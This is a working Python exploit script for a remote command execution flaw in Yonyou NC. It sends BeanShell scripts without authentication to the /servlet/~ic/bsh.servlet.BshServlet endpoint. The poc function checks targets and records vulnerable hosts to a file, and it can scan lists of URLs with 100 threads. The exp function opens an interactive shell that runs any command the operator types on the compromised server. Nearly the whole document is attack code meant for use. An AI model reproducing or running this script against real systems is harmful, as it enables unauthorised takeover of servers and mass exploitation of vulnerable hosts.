#-*- coding: utf-8 -*-
import argparse,sys,requests
import os
import re
import time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
 .----------------.  .----------------.  .-----------------. .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |  ____  ____  | || | ____  _____  | || |     ______   | |
| | |_  _||_  _| | || | |_  _||_  _| | || ||_   \|_   _| | || |   .' ___  |  | |
| |   \ \  / /   | || |   \ \  / /   | || |  |   \ | |   | || |  / .'   \_|  | |
| |    \ \/ /    | || |    \ \/ /    | || |  | |\ \| |   | || |  | |         | |
| |    _|  |_    | || |    _|  |_    | || | _| |_\   |_  | || |  \ `.___.'\  | |
| |   |______|   | || |   |______|   | || ||_____|\____| | || |   `._____.'  | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 
                                       tag:  YYNC                                      
                                       @version: 1.0.0   @author: Despacitio096           
"""
    print(test)
#"title" = "YONGYOU NC"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54",
}
def poc(target):
    url = target + "/servlet/~ic/bsh.servlet.BshServlet"
    data = {"bsh.script":'print("poctest");'}
    try:
        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
        if "poctest" in res:
            print(f"[+] {target} is vulnable")
            with open("yync.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
                return True
        else:
            print(f"[-] {target} is not vulnable")
            return False

    except:
        print(f"{target} access error!")
        return False



def exp(target):
    print("loading...")
    time.sleep(2)
    os.system("cls")
    while True:
        cmd = input("请输入你要执行的命令(q--->quit)\n>>>")
        if cmd == "q":
            exit()
        url = target + "/servlet/~ic/bsh.servlet.BshServlet"
        data = {"bsh.script": f'''exec("{cmd}");'''}
        try:
            res = requests.post(url, headers=headers, data=data, timeout=5, verify=False).text
            result = re.findall('''<pre>(.*?)</pre>''',res,re.S)[0]
            print(result)
        except:
            print("执行异常,请称重新执行其它命令试试")


def main():
    banner()
    parser = argparse.ArgumentParser(description='This vulnerability is a remote command execution vulnerability, because Yonyou NC opens the BeanShell interface to the outside world, the attacker can directly access the interface without authentication, and construct malicious data to execute arbitrary commands, and the target server permissions can be obtained after the attack is successful.')
    parser.add_argument("-u", "--url", dest="url", type=str, help="test poc && exp,single one")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" +urls.txt  test abundant urls")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
